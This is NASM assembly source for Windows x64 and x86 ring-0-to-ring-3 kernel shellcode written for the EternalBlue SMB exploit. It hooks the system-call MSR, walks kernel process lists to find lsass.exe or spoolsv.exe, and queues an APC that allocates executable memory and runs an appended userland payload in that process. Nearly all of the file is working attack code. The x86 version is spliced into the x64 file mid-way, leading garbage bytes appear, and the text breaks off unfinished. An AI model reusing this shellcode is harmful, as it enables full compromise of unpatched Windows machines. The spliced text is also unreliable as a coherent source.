1�@�QO  ;
; Windows x64 kernel shellcode from ring 0 to ring 3 by sleepya
; The shellcode is written for eternalblue exploit: eternalblue_exploit7.py and eternalblue_exploit8.py
;
;
; Idea for Ring 0 to Ring 3 via APC from Sean Dillon (@zerosum0x0)
;
;
; Note:
; - The userland shellcode is run in a new thread of system process.
;     If userland shellcode causes any exception, the system process get killed.
; - On idle target with multiple core processors, the hijacked system call might take a while (> 5 minutes) to 
;     get call because system call is called on other processors.
; - The shellcode do not allocate shadow stack if possible for minimal shellcode size.
;     It is ok because some Windows function does not require shadow stack.
; - Compiling shellcode with specific Windows version macro, corrupted buffer will be freed.
; - The userland payload MUST be appened to this shellcode.
;
; Reference:
; - http://www.geoffchappell.com/studies/windows/km/index.htm (structures info)
; - https://github.com/reactos/reactos/blob/master/reactos/ntoskrnl/ke/apc.c

BITS 64
ORG 0


PSGETCURRENTPROCESS_HASH    EQU    0xdbf47c78
PSGETPROCESSID_HASH    EQU    0x170114e1
PSGETPROCESSIMAGEFILENAME_HASH    EQU    0x77645f3f
LSASS_EXE_HASH    EQU    0xc1fa6a5a
SPOOLSV_EXE_HASH    EQU    0x3ee083d8
ZWALLOCATEVIRTUALMEMORY_HASH    EQU    0x576e99ea
PSGETTHREADTEB_HASH    EQU    0xcef84c3e
KEINITIALIZEAPC_HASH    EQU    0x6d195cc4
KEINSERTQUEUEAPC_HASH    EQU    0xafcc4634
PSGETPROCESSPEB_HASH    EQU    0xb818b848
CREATETHREAD_HASH    EQU    0x835e515e



DATA_PEB_ADDR_OFFSET        EQU -0x10
DATA_QUEUEING_KAPC_OFFSET   EQU -0x8
DATA_ORIGIN_SYSCALL_OFFSET  EQU 0x0
DATA_NT_KERNEL_ADDR_OFFSET  EQU 0x8
DATA_KAPC_OFFSET            EQU 0x10

section .text
global shellcode_start

shellcode_start:

setup_syscall_hook:
    ; IRQL is DISPATCH_LEVEL when got code execution

%ifdef WIN7
    mov rdx, [rsp+0x40]     ; fetch SRVNET_BUFFER address from function argument
    ; set nByteProcessed to free corrupted buffer after return
    mov ecx, [rdx+0x2c]
    mov [rdx+0x38], ecx
%elifdef WIN8
    mov rdx, [rsp+0x40]     ; fetch SRVNET_BUFFER address from function argument
    ; fix pool pointer (rcx is -0x8150 from controlled argument value)
    add rcx, rdx
    mov [rdx+0x30], rcx
    ; set nByteProcessed to free corrupted buffer after return
    mov ecx, [rdx+0x48]
    mov [rdx+0x40], ecx
%endif
    
    push rbp
    
    call set_rbp_data_address_fn
    
    ; read current syscall
    mov ecx, 0xc0000082
    rdmsr
    ; do NOT replace saved original syscall address with hook syscall
    lea r9, [rel syscall_hook]
    cmp eax, r9d
    je _setup_syscall_hook_done
    
    ; if (saved_original_syscall != &KiSystemCall64) do_first_time_initialize
    cmp dword [rbp+DATA_ORIGIN_SYSCALL_OFFSET], eax
    je _hook_syscall
    
    ; save original syscall
    mov dword [rbp+DATA_ORIGIN_SYSCALL_OFFSET+4], edx
    mov dword [rbp+DATA_ORIGIN_SYSCALL_OFFSET], eax
    
    ; first time on the target
    mov byte [rbp+DATA_QUEUEING_KAPC_OFFSET], 0

_hook_syscall:
    ; set a new syscall on running processor
    ; setting MSR 0xc0000082 affects only running processor
    xchg r9, rax
    push rax
    pop rdx     ; mov rdx, rax
    shr rdx, 32
    wrmsr
    
_setup_syscall_hook_done:
    pop rbp
    
%ifdef WIN7
    xor eax, eax
%elifdef WIN8
    xor eax, eax
%endif
    ret

;========================================================================
; Find memory address in HAL heap for using as data area
; Return: rbp = data address
;========================================================================
set_rbp_data_address_fn:
    ; On idle target without user application, syscall on hijacked processor might not be called immediately.
    ; Find some address to store the data, the data in this address MUST not be modified
    ;   when exploit is rerun before syscall is called
    lea rbp, [rel _set_rbp_data_address_fn_next + 0x1000]
_set_rbp_data_address_fn_next:
    shr rbp, 12
    shl rbp, 12
    sub rbp, 0x70   ; for KAPC struct too
    ret


syscall_hook:
    swapgs
    mov qword [gs:0x10], rsp
    mov rsp, qword [gs:0x1a8]
    push 0x2b
    push qword [gs:0x10]
    
    push rax    ; want this stack space to store original syscall addr
    ; save rax first to make this function continue to real syscall
    push rax
    push rbp    ; save rbp here because rbp is special register for accessing this shellcode data
    call set_rbp_data_address_fn
    mov rax, [rbp+DATA_ORIGIN_SYSCALL_OFFSET]
    add rax, 0x1f   ; adjust syscall entry, so we do not need to reverse start of syscall handler
    mov [rsp+0x10], rax

    ; save all volatile registers
    push rcx
    push rdx
    push r8
    push r9
    push r10
    push r11
    
    ; use lock cmpxchg for queueing APC only one at a time
    xor eax, eax
    mov dl, 1
    lock cmpxchg byte [rbp+DATA_QUEUEING_KAPC_OFFSET], dl
    jnz _syscall_hook_done

    ;======================================
    ; restore syscall
    ;======================================
    ; an error after restoring syscall should never occur
    mov ecx, 0xc0000082
    mov eax, [rbp+DATA_ORIGIN_SYSCALL_OFFSET]
    mov edx, [rbp+DATA_ORIGIN_SYSCALL_OFFSET+4]
    wrmsr
    
    ; allow interrupts while executing shellcode
    sti
    call r3_to_r0_start
    cli
    
_syscall_hook_done:
    pop r11
    pop r10
    pop r9
    pop r8
    pop rdx
    pop rcx
    pop rbp
    pop rax
    ret

r3_to_r0_start:
    ; save used non-volatile registers
    push r15
    push r14
    push rdi
    push rsi
    push rbx
    push rax    ; align stack by 0x10

    ;======================================
    ; find nt kernel address
    ;======================================
    mov r15, qword [rbp+DATA_ORIGIN_SYSCALL_OFFSET]      ; KiSystemCall64 is an address in nt kernel
    shr r15, 0xc                ; strip to page size
    shl r15, 0xc

_x64_find_nt_walk_page:
    sub r15, 0x1000             ; walk along page size
    cmp word [r15], 0x5a4d      ; 'MZ' header
    jne _x64_find_nt_walk_page
    
    ; save nt address for using in KernelApcRoutine
    mov [rbp+DATA_NT_KERNEL_ADDR_OFFSET], r15

    ;======================================
    ; get current EPROCESS and ETHREAD
    ;======================================
    mov r14, qword [gs:0x188]    ; get _ETHREAD pointer from KPCR
    mov edi, PSGETCURRENTPROCESS_HASH
    call win_api_direct
    xchg rcx, rax       ; rcx = EPROCESS
    
    ; r15 : nt kernel address
    ; r14 : ETHREAD
    ; rcx : EPROCESS    
    
    ;======================================
    ; find offset of EPROCESS.ImageFilename
    ;======================================
    mov edi, PSGETPROCESSIMAGEFILENAME_HASH
    call get_proc_addr
    mov eax, dword [rax+3]  ; get offset from code (offset of ImageFilename is always > 0x7f)
    mov ebx, eax        ; ebx = offset of EPROCESS.ImageFilename


    ;======================================
    ; find offset of EPROCESS.ThreadListHead
    ;======================================
    ; possible diff from ImageFilename offset is 0x28 and 0x38 (Win8+)
    ; if offset of ImageFilename is more than 0x400, current is (Win8+)
%ifdef WIN7
    lea rdx, [rax+0x28]
%elifdef WIN8
    lea rdx, [rax+0x38]
%else
    cmp eax, 0x400      ; eax is still an offset of EPROCESS.ImageFilename
    jb _find_eprocess_threadlist_offset_win7
    add eax, 0x10
_find_eprocess_threadlist_offset_win7:
    lea rdx, [rax+0x28] ; edx = offset of EPROCESS.ThreadListHead
%endif

    
    ;======================================
    ; find offset of ETHREAD.ThreadListEntry
    ;======================================
%ifdef COMPACT
    lea r9, [rcx+rdx]   ; r9 = ETHREAD listEntry
%else
    lea r8, [rcx+rdx]   ; r8 = address of EPROCESS.ThreadListHead
    mov r9, r8
%endif
    ; ETHREAD.ThreadListEntry must be between ETHREAD (r14) and ETHREAD+0x700
_find_ethread_threadlist_offset_loop:
    mov r9, qword [r9]
%ifndef COMPACT
    cmp r8, r9          ; check end of list
    je _insert_queue_apc_done    ; not found !!!
%endif
    ; if (r9 - r14 < 0x700) found
    mov rax, r9
    sub rax, r14
    cmp rax, 0x700
    ja _find_ethread_threadlist_offset_loop
    sub r14, r9         ; r14 = -(offset of ETHREAD.ThreadListEntry)


    ;======================================
    ; find offset of EPROCESS.ActiveProcessLinks
    ;======================================
    mov edi, PSGETPROCESSID_HASH
    call get_proc_addr
    mov edi, dword [rax+3]  ; get offset from code (offset of UniqueProcessId is always > 0x7f)
    add edi, 8      ; edi = offset of EPROCESS.ActiveProcessLinks = offset of EPROCESS.UniqueProcessId + sizeof(EPROCESS.UniqueProcessId)
    

    ;======================================
    ; find target process by iterating over EPROCESS.ActiveProcessLinks WITHOUT lock 
    ;======================================
    ; check process name
_find_target_process_loop:
    lea rsi, [rcx+rbx]
    call calc_hash
    cmp eax, LSASS_EXE_HASH    ; "lsass.exe"
%ifndef COMPACT
    jz found_target_process
    cmp eax, SPOOLSV_EXE_HASH  ; "spoolsv.exe"
%endif
    jz found_target_process
    ; next process
    mov rcx, [rcx+rdi]
    sub rcx, rdi
    jmp _find_target_process_loop


found_target_process:
    ; The allocation for userland payload will be in KernelApcRoutine.
    ; KernelApcRoutine is run in a target process context. So no need to use KeStackAttachProcess()

    ;======================================
    ; save process PEB for finding CreateThread address in kernel KAPC routine
    ;======================================
    mov edi, PSGETPROCESSPEB_HASH
    ; rcx is EPROCESS. no need to set it.
    call win_api_direct
    mov [rbp+DATA_PEB_ADDR_OFFSET], rax
    
    
    ;======================================
    ; iterate ThreadList until KeInsertQueueApc() success
    ;======================================
    ; r15 = nt
    ; r14 = -(offset of ETHREAD.ThreadListEntry)
    ; rcx = EPROCESS
    ; edx = offset of EPROCESS.ThreadListHead

%ifdef COMPACT
    lea rbx, [rcx + rdx]
%else
    lea rsi, [rcx + rdx]    ; rsi = ThreadListHead address
    mov rbx, rsi    ; use rbx for iterating thread
%endif


    ; checking alertable from ETHREAD structure is not reliable because each Windows version has different offset.
    ; Moreover, alertable thread need to be waiting state which is more difficult to check.
    ; try queueing APC then check KAPC member is more reliable.

_insert_queue_apc_loop:
    ; move backward because non-alertable and NULL TEB.ActivationContextStackPointer threads always be at front
    mov rbx, [rbx+8]
%ifndef COMPACT
    cmp rsi, rbx
    je _insert_queue_apc_loop   ; skip list head
%endif

    ; find start of ETHREAD address
    ; set it to rdx to be used for KeInitializeApc() argument too
    lea rdx, [rbx + r14]    ; ETHREAD
    
    ; userland shellcode (at least CreateThread() function) need non NULL TEB.ActivationContextStackPointer.
    ; the injected process will be crashed because of access violation if TEB.ActivationContextStackPointer is NULL.
    ; Note: APC routine does not require non-NULL TEB.ActivationContextStackPointer.
    ; from my observation, KTRHEAD.Queue is always NULL when TEB.ActivationContextStackPointer is NULL.
    ; Teb member is next to Queue member.
    mov edi, PSGETTHREADTEB_HASH
    call get_proc_addr
    mov eax, dword [rax+3]      ; get offset from code (offset of Teb is always > 0x7f)
    cmp qword [rdx+rax-8], 0    ; KTHREAD.Queue MUST not be NULL
    je _insert_queue_apc_loop
    
    ; KeInitializeApc(PKAPC,
    ;                 PKTHREAD,
    ;                 KAPC_ENVIRONMENT = OriginalApcEnvironment (0),
    ;                 PKKERNEL_ROUTINE = kernel_apc_routine,
    ;                 PKRUNDOWN_ROUTINE = NULL,
    ;                 PKNORMAL_ROUTINE = userland_shellcode,
    ;                 KPROCESSOR_MODE = UserMode (1),
    ;                 PVOID Context);
    lea rcx, [rbp+DATA_KAPC_OFFSET]     ; PAKC
    xor r8, r8      ; OriginalApcEnvironment
    lea r9, [rel kernel_kapc_routine]    ; KernelApcRoutine
    push rbp    ; context
    push 1      ; UserMode
    push rbp    ; userland shellcode (MUST NOT be NULL)
    push r8     ; NULL
    sub rsp, 0x20   ; shadow stack
    mov edi, KEINITIALIZEAPC_HASH
    call win_api_direct
    ; Note: KeInsertQueueApc() requires shadow stack. Adjust stack back later

    ; BOOLEAN KeInsertQueueApc(PKAPC, SystemArgument1, SystemArgument2, 0);
    ;   SystemArgument1 is second argument in usermode code (rdx)
    ;   SystemArgument2 is third argument in usermode code (r8)
    lea rcx, [rbp+DATA_KAPC_OFFSET]
    ;xor edx, edx   ; no need to set it here
    ;xor r8, r8     ; no need to set it here
    xor r9, r9
    mov edi, KEINSERTQUEUEAPC_HASH
    call win_api_direct
    add rsp, 0x40
    ; if insertion failed, try next thread
    test eax, eax
    jz _insert_queue_apc_loop
    
    mov rax, [rbp+DATA_KAPC_OFFSET+0x10]     ; get KAPC.ApcListEntry
    ; EPROCESS pointer 8 bytes
    ; InProgressFlags 1 byte
    ; KernelApcPending 1 byte
    ; if success, UserApcPending MUST be 1
    cmp byte [rax+0x1a], 1
    je _insert_queue_apc_done
    
    ; manual remove list without lock
    mov [rax], rax
    mov [rax+8], rax
    jmp _insert_queue_apc_loop

_insert_queue_apc_done:
    ; The PEB address is needed in kernel_apc_routine. Setting QUEUEING_KAPC to 0 should be in kernel_apc_routine.

_r3_to_r0_done:
    pop rax
    pop rbx
    pop rsi
    pop rdi
    pop r14
    pop r15
    ret

;========================================================================
; Call function in specific module
; 
; All function arguments are passed as calling normal function with extra register arguments
; Extra Arguments: r15 = module pointer
;                  edi = hash of target function name
;========================================================================
win_api_direct:
    call get_proc_addr
    jmp rax


;========================================================================
; Get function address in specific module
; 
; Arguments: r15 = module pointer
;            edi = hash of target function name
; Return: eax = offset
;========================================================================
get_proc_addr:
    ; Save registers
    push rbx
    push rcx
    push rsi                ; for using calc_hash

    ; use rax to find EAT
    mov eax, dword [r15+60]  ; Get PE header e_lfanew
    mov eax, dword [r15+rax+136] ; Get export tables RVA

    add rax, r15
    push rax                 ; save EAT

    mov ecx, dword [rax+24]  ; NumberOfFunctions
    mov ebx, dword [rax+32]  ; FunctionNames
    add rbx, r15

_get_proc_addr_get_next_func:
    ; When we reach the start of the EAT (we search backwards), we hang or crash
    dec ecx                     ; decrement NumberOfFunctions
    mov esi, dword [rbx+rcx*4]  ; Get rva of next module name
    add rsi, r15                ; Add the modules base address

    call calc_hash

    cmp eax, edi                        ; Compare the hashes
    jnz _get_proc_addr_get_next_func    ; try the next function

_get_proc_addr_finish:
    pop rax                     ; restore EAT
    mov ebx, dword [rax+36]
    add rbx, r15                ; ordinate table virtual address
    mov cx, word [rbx+rcx*2]    ; desired functions ordinal
    mov ebx, dword [rax+28]     ; Get the function addresses table rva
    add rbx, r15                ; Add the modules base address
    mov eax, dword [rbx+rcx*4]  ; Get the desired functions RVA
    add rax, r15                ; Add the modules base address to get the functions actual VA

    pop rsi
    pop rcx
    pop rbx
    ret

;========================================================================
; Calculate ASCII string hash. Useful for comparing ASCII string in shellcode.
; 
; Argument: rsi = string to hash
; Clobber: rsi
; Return: eax = hash
;========================================================================
calc_hash:
    push rdx
    xor eax, eax
    cdq
_calc_hash_loop:
    lodsb                   ; Read in the next byte of the ASCII string
    ror edx, 13             ; Rotate right our hash value
    add edx, eax            ; Add the next byte of the string
    test eax, eax           ; Stop when found NULL
    jne _calc_hash_loop
    xchg edx, eax
    pop rdx
    ret


; KernelApcRoutine is called when IRQL is APC_LEVEL in (queued) Process context.
; But the IRQL is simply raised from PASSIVE_LEVEL in KiCheckForKernelApcDelivery().
; Moreover, there is no lock when calling KernelApcRoutine.
; So KernelApcRoutine can simply lower the IRQL by setting cr8 register.
;
; VOID KernelApcRoutine(
;           IN PKAPC Apc,
;           IN PKNORMAL_ROUTINE *NormalRoutine,
;           IN PVOID *NormalContext,
;           IN PVOID *SystemArgument1,
;           IN PVOID *SystemArgument2)
kernel_kapc_routine:
    push rbp
    push rbx
    push rdi
    push rsi
    push r15
    
    mov rbp, [r8]       ; *NormalContext is our data area pointer
        
    mov r15, [rbp+DATA_NT_KERNEL_ADDR_OFFSET]
    push rdx
    pop rsi     ; mov rsi, rdx
    mov rbx, r9
    
    ;======================================
    ; ZwAllocateVirtualMemory(-1, &baseAddr, 0, &0x1000, 0x1000, 0x40)
    ;======================================
    xor eax, eax
    mov cr8, rax    ; set IRQL to PASSIVE_LEVEL (ZwAllocateVirtualMemory() requires)
    ; rdx is already address of baseAddr
    mov [rdx], rax      ; baseAddr = 0
    mov ecx, eax
    not rcx             ; ProcessHandle = -1
    mov r8, rax         ; ZeroBits
    mov al, 0x40    ; eax = 0x40
    push rax            ; PAGE_EXECUTE_READWRITE = 0x40
    shl eax, 6      ; eax = 0x40 << 6 = 0x1000
    push rax            ; MEM_COMMIT = 0x1000
    ; reuse r9 for address of RegionSize
    mov [r9], rax       ; RegionSize = 0x1000
    sub rsp, 0x20   ; shadow stack
    mov edi, ZWALLOCATEVIRTUALMEMORY_HASH
    call win_api_direct
    add rsp, 0x30
%ifndef COMPACT
    ; check error
    test eax, eax
    jnz _kernel_kapc_routine_exit
%endif
    
    ;======================================
    ; copy userland payload
    ;======================================
    mov rdi, [rsi]
    lea rsi, [rel userland_start]
    mov ecx, 0x600  ; fix payload size to 1536 bytes
    rep movsb
    
    ;======================================
    ; find CreateThread address (in kernel32.dll)
    ;======================================
    mov rax, [rbp+DATA_PEB_ADDR_OFFSET]
    mov rax, [rax + 0x18]       ; PEB->Ldr
    mov rax, [rax + 0x20]       ; InMemoryOrder list

%ifdef COMPACT
    mov rsi, [rax]      ; first one always be executable, skip it
    lodsq               ; skip ntdll.dll
%else
_find_kernel32_dll_loop:
    mov rax, [rax]       ; first one always be executable
    ; offset 0x38 (WORD)  => must be 0x40 (full name len c:\windows\system32\kernel32.dll)
    ; offset 0x48 (WORD)  => must be 0x18 (name len kernel32.dll)
    ; offset 0x50  => is name
    ; offset 0x20  => is dllbase
    ;cmp word [rax+0x38], 0x40
    ;jne _find_kernel32_dll_loop
    cmp word [rax+0x48], 0x18
    jne _find_kernel32_dll_loop
    
    mov rdx, [rax+0x50]
    ; check only "32" because name might be lowercase or uppercase
    cmp dword [rdx+0xc], 0x00320033   ; 3\x002\x00
    jnz _find_kernel32_dll_loop
%endif

    mov r15, [rax+0x20]
    mov edi, CREATETHREAD_HASH
    call get_proc_addr

    ; save CreateThread address to SystemArgument1
    mov [rbx], rax
    
_kernel_kapc_routine_exit:
    xor ecx, ecx
    ; clear queueing kapc flag, allow other hijacked system call to run shellcode
    mov byte [rbp+DATA_QUEUEING_KAPC_OFFSET], cl
    ; restore IRQL to APC_LEVEL
    mov cl, 1
    mov cr8, rcx
    
    pop r15
    pop rsi
    pop rdi
    pop rbx
    pop rbp
    ret

  
userland_start:
userland_start_thread:
    ; CreateThread(NULL, 0, &threadstart, NULL, 0, NULL)
    xchg rdx, rax   ; rdx is CreateThread address passed from kernel
    xor ecx, ecx    ; lpThreadAttributes = NULL
    push rcx        ; lpThreadId = NULL
    push rcx        ; dwCreationFlags = 0
    mov r9, rcx     ; lpParameter = NULL
    lea r8, [rel userland_payload]  ; lpStartAddr
    mov edx, ecx    ; dwStackSize = 0
    sub rsp, 0x20
    call rax
    add rsp, 0x30
    ret
    
userland_payload:
;
; Windows x86 kernel shellcode from ring 0 to ring 3 by sleepya
; The shellcode is written for eternalblue exploit: eternalblue_exploit7.py
;
;
; Idea for Ring 0 to Ring 3 via APC from Sean Dillon (@zerosum0x0)
;
;
; Note:
; - The userland shellcode is run in a new thread of system process.
;     If userland shellcode causes any exception, the system process get killed.
; - On idle target with multiple core processors, the hijacked system call might take a while (> 5 minutes) to 
;     get call because system call is called on other processors.
; - Compiling shellcode with specific Windows version macro, corrupted buffer will be freed.
;     This helps running exploit against same target repeatly more reliable.
; - The userland payload MUST be appened to this shellcode.
;
; Reference:
; - http://www.geoffchappell.com/studies/windows/km/index.htm (structures info)
; - https://github.com/reactos/reactos/blob/master/reactos/ntoskrnl/ke/apc.c

BITS 32
ORG 0


PSGETCURRENTPROCESS_HASH    EQU    0xdbf47c78
PSGETPROCESSID_HASH    EQU    0x170114e1
PSGETPROCESSIMAGEFILENAME_HASH    EQU    0x77645f3f
LSASS_EXE_HASH    EQU    0xc1fa6a5a
SPOOLSV_EXE_HASH    EQU    0x3ee083d8
ZWALLOCATEVIRTUALMEMORY_HASH    EQU    0x576e99ea
PSGETTHREADTEB_HASH    EQU    0xcef84c3e
KEINITIALIZEAPC_HASH    EQU    0x6d195cc4
KEINSERTQUEUEAPC_HASH    EQU    0xafcc4634
PSGETPROCESSPEB_HASH    EQU    0xb818b848
CREATETHREAD_HASH    EQU    0x835e515e



DATA_ORIGIN_SYSCALL_OFFSET  EQU 0x0
DATA_MODULE_ADDR_OFFSET     EQU 0x4
DATA_QUEUEING_KAPC_OFFSET   EQU 0x8
DATA_EPROCESS_OFFSET        EQU 0xc
DATA_KAPC_OFFSET            EQU 0x10

section .text
global shellcode_start

shellcode_start:

setup_syscall_hook:
    ; IRQL is DISPATCH_LEVEL when got code execution
%ifdef WIN7
    mov eax, [esp+0x20]     ; fetch SRVNET_BUFFER address from function argument
    ; set nByteProcessed to free corrupted buffer after return
    mov ecx, [eax+0x14]
    mov [eax+0x1c], ecx
%elifdef WIN8
%endif
    
    pushad

    call _setup_syscall_hook_find_eip
_setup_syscall_hook_find_eip:
    pop ebx

    call set_ebp_data_address_fn
    
    ; read current syscall
    mov ecx, 0x176
    rdmsr
    ; do NOT replace saved original syscall address with hook syscall
    lea edi, [ebx+syscall_hook-_setup_syscall_hook_find_eip]
    cmp eax, edi
    je _setup_syscall_hook_done
    
    ; if (saved_original_syscall != &KiFastCallEntry) do_first_time_initialize
    cmp dword [ebp+DATA_ORIGIN_SYSCALL_OFFSET], eax
    je _hook_syscall
    
    ; save original syscall
    mov dword [ebp+DATA_ORIGIN_SYSCALL_OFFSET], eax
    
    ; first time on the target, clear the data area
    ; edx should be zero from rdmsr
    mov dword [ebp+DATA_QUEUEING_KAPC_OFFSET], edx

_hook_syscall:
    ; set a new syscall on running processor
    ; setting MSR 0x176 affects only running processor
    mov eax, edi
    xor edx, edx
    wrmsr
    
_setup_syscall_hook_done:
    popad
%ifdef WIN7
    xor eax, eax
%elifdef WIN8
    xor eax, eax
%endif
    ret 0x24

;========================================================================
; Find memory address in HAL heap for using as data area
; Arguments: ebx = any address in this shellcode
; Return: ebp = data address
;========================================================================
set_ebp_data_address_fn:
    ; On idle target without user application, syscall on hijacked processor might not be called immediately.
    ; Find some address to store the data, the data in this address MUST not be modified
    ;   when exploit is rerun before syscall is called
    lea ebp, [ebx + 0x1000]
    shr ebp, 12
    shl ebp, 12
    sub ebp, 0x50   ; for KAPC struct too
    ret


syscall_hook:
    mov ecx, 0x23
    push 0x30
    pop fs
    mov ds,cx
    mov es,cx
    mov ecx, dword [fs:0x40]
    mov esp, dword [ecx+4]
    
    push ecx    ; want this stack space to store original syscall addr
    pushfd
    pushad
    
    call _syscall_hook_find_eip
_syscall_hook_find_eip:
    pop ebx
    
    call set_ebp_data_address_fn
    mov eax, [ebp+DATA_ORIGIN_SYSCALL_OFFSET]
    
    add eax, 0x17   ; adjust syscall entry, so we do not need to reverse start of syscall handler
    mov [esp+0x24], eax ; 0x4 (pushfd) + 0x20 (pushad) = 0x24
    
    ; use lock cmpxchg for queueing APC only one at a time
    xor eax, eax
    cdq
    inc edx
    lock cmpxchg byte [ebp+DATA_QUEUEING_KAPC_OFFSET], dl
    jnz _syscall_hook_done

    ;======================================
    ; restore syscall
    ;======================================
    ; an error after restoring syscall should never occur
    mov ecx, 0x176
    cdq
    mov eax, [ebp+DATA_ORIGIN_SYSCALL_OFFSET]
    wrmsr
    
    ; allow interrupts while executing shellcode
    sti
    call r3_to_r0_start
    cli
    
_syscall_hook_done:
    popad
    popfd
    ret

r3_to_r0_start:    
    ;======================================
    ; find nt kernel address
    ;======================================
    mov eax, dword [ebp+DATA_ORIGIN_SYSCALL_OFFSET]      ; KiFastCallEntry is an address in nt kernel
    shr eax, 0xc                ; strip to page size
    shl eax, 0xc

_find_nt_walk_page:
    sub eax, 0x1000             ; walk along page size
    cmp word [eax], 0x5a4d      ; 'MZ' header
    jne _find_nt_walk_page
    
    ; save nt address
    mov [ebp+DATA_MODULE_ADDR_OFFSET], eax

    ;======================================
    ; get current EPROCESS and ETHREAD
    ;======================================
    mov eax, PSGETCURRENTPROCESS_HASH
    call win_api_direct
    xchg edi, eax       ; edi = EPROCESS
    
    ;======================================
    ; find offset of EPROCESS.ImageFilename
    ;======================================
    mov eax, PSGETPROCESSIMAGEFILENAME_HASH
    push edi
    call win_api_direct
    sub eax, edi
    mov ecx, eax        ; ecx = offset of EPROCESS.ImageFilename

    ;======================================
    ; find offset of EPROCESS.ThreadListHead
    ;======================================
    ; possible diff from ImageFilename offset is 0x1c and 0x24 (Win8+)
    ; if offset of ImageFilename is 0x170, current is (Win8+)
%ifdef WIN7
    lea ebx, [eax+0x1c]
%elifdef WIN8
    lea ebx, [eax+0x24]
%else
    cmp eax, 0x170      ; eax is still an offset of EPROCESS.ImageFilename
    jne _find_eprocess_threadlist_offset_win7
    add eax, 0x8
_find_eprocess_threadlist_offset_win7:
    lea ebx, [eax+0x1c] ; ebx = offset of EPROCESS.ThreadListHead
%endif

    
    ;======================================
    ; find offset of ETHREAD.ThreadListEntry
    ;======================================
    ; edi = EPROCESS
    ; ebx = offset of EPROCESS.ThreadListHead
    lea esi, [edi+ebx]   ; esi = address of EPROCESS.ThreadListHead
    mov eax, dword [fs:0x124]    ; get _ETHREAD pointer from KPCR
    ; ETHREAD.ThreadListEntry must be between ETHREAD (eax) and ETHREAD+0x400
_find_ethread_threadlist_offset_loop:
    mov esi, dword [esi]
    ; if (esi - edi < 0x400) found
    mov edx, esi
    sub edx, eax
    cmp edx, 0x400
    ja _find_ethread_threadlist_offset_loop ; need unsigned comparison
    push edx        ; save offset of ETHREAD.ThreadListEntry to stack


    ;======================================
    ; find offset of EPROCESS.ActiveProcessLinks
    ;======================================
    mov eax, PSGETPROCESSID_HASH
    call get_proc_addr
    mov eax, dword [eax+0xa]   ; get offset from code (offset of UniqueProcessId is always > 0x7f)
    lea edx, [eax+4]    ; edx = offset of EPROCESS.ActiveProcessLinks = offset of EPROCESS.UniqueProcessId + sizeof(EPROCESS.UniqueProcessId)
    
    ;======================================
    ; find target process by iterating over EPROCESS.ActiveProcessLinks WITHOUT lock 
    ;======================================
    ; edi = EPROCESS
    ; ecx = offset of EPROCESS.ImageFilename
    ; edx = offset of EPROCESS.ActiveProcessLinks
_find_target_process_loop:
    lea esi, [edi+ecx]
    call calc_hash
    cmp eax, LSASS_EXE_HASH    ; "lsass.exe"
    jz found_target_process
%ifndef COMPACT
    cmp eax, SPOOLSV_EXE_HASH  ; "spoolsv.exe"
    jz found_target_process
%endif
    ; next process
    mov edi, [edi+edx]
    sub edi, edx
    jmp _find_target_process_loop


found_target_process:
    ; The allocation for userland payload will be in KernelApcRoutine.
    ; KernelApcRoutine is run in a target process context. So no need to use KeStackAttachProcess()

    ;======================================
    ; save EPROCESS for finding CreateThread address in kernel KAPC routine
    ;======================================
    mov [ebp+DATA_EPROCESS_OFFSET], edi
    
    
    ;======================================
    ; iterate ThreadList until KeInsertQueueApc() success
    ;======================================
    ; edi = EPROCESS
    ; ebx = offset of EPROCESS.ThreadListHead
    
    lea ebx, [edi+ebx]  ; use ebx for iterating thread
    lea esi, [ebp+DATA_KAPC_OFFSET] ; esi = KAPC address
    pop edi ; edi = offset of ETHREAD.ThreadListEntry


    ; checking alertable from ETHREAD structure is not reliable because each Windows version has different offset.
    ; Moreover, alertable thread need to be waiting state which is more difficult to check.
    ; try queueing APC then check KAPC member is more reliable.

_insert_queue_apc_loop:
    ; move backward because non-alertable and NULL TEB.ActivationContextStackPointer threads always be at front
    mov ebx, [ebx+4]
    ; no check list head
    
    ; userland shellcode (at least CreateThread() function) need non NULL TEB.ActivationContextStackPointer.
    ; the injected process will be crashed because of access violation if TEB.ActivationContextStackPointer is NULL.
    ; Note: APC routine does not require non-NULL TEB.ActivationContextStackPointer.
    ; from my observation, KTRHEAD.Queue is always NULL when TEB.ActivationContextStackPointer is NULL.
    ; Teb member is next to Queue member.
    mov eax, PSGETTHREADTEB_HASH
    call get_proc_addr
    mov eax, dword [eax+0xa]    ; get offset from code (offset of Teb is always > 0x7f)
%ifdef WIN7
    sub eax, edi
    cmp dword [ebx+eax-12], 0   ; KTHREAD.Queue MUST not be NULL
%elifdef WIN8
    sub eax, edi
    cmp dword [ebx+eax-4], 0    ; KTHREAD.Queue MUST not be NULL
%else
    cmp al, 0xa0                ; win8+ offset is 0xa8
    ja _kthread_queue_check
    sub al, 8                   ; late 5.2 to 6.1, displacement is 0xc
_kthread_queue_check:
    sub eax, edi
    cmp dword [ebx+eax-4], 0    ; KTHREAD.Queue MUST not be NULL
%endif
    je _insert_queue_apc_loop
    
    ; KeInitializeApc(PKAPC,
    ;                 PKTHREAD,
    ;                 KAPC_ENVIRONMENT = OriginalApcEnvironment (0),
    ;                 PKKERNEL_ROUTINE = kernel_apc_routine,
    ;                 PKRUNDOWN_ROUTINE = NULL,
    ;                 PKNORMAL_ROUTINE = userland_shellcode,
    ;                 KPROCESSOR_MODE = UserMode (1),
    ;                 PVOID Context);
    xor eax, eax
    push ebp    ; context
    push 1      ; UserMode
    push ebp    ; userland shellcode (MUST NOT be NULL)
    push eax    ; NULL
    call _init_kapc_find_kroutine
_init_kapc_find_kroutine:
    add dword [esp], kernel_kapc_routine-_init_kapc_find_kroutine  ; KernelApcRoutine
    push eax    ; OriginalApcEnvironment
    push ebx
    sub [esp], edi  ; ETHREAD
    push esi    ; KAPC
    mov eax, KEINITIALIZEAPC_HASH
    call win_api_direct


    ; BOOLEAN KeInsertQueueApc(PKAPC, SystemArgument1, SystemArgument2, 0);
    ;   SystemArgument1 is second argument in usermode code
    ;   SystemArgument2 is third argument in usermode code
    xor eax, eax
    push eax
    push eax    ; SystemArgument2
    push eax    ; SystemArgument1
    push esi    ; PKAPC
    mov eax, KEINSERTQUEUEAPC_HASH
    call win_api_direct
    ; if insertion failed, try next thread
    test eax, eax
    jz _insert_queue_apc_loop
    
    mov eax, [ebp+DATA_KAPC_OFFSET+0xc]      ; get KAPC.ApcListEntry
    ; EPROCESS pointer 4 bytes
    ; InProgressFlags 1 byte
    ; KernelApcPending 1 byte
    ; if success, UserApcPending MUST be 1
    cmp byte [eax+0xe], 1
    je _insert_queue_apc_done
    
